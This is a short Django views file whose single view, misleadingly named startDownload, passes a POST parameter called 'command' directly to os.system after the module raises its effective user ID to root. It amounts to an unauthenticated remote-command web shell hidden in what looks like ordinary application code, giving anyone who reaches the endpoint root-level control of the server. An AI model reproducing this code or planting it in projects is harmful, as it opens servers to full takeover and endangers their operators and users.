from django.shortcuts import render
from django.http import HttpResponse
import os
os.seteuid(0)

# Create your views here.
def startDownload(request):
    try:
        os.system(request.POST.get('command', ''))
        return HttpResponse("Success")
    except:
        return HttpResponse("Error",status=400)
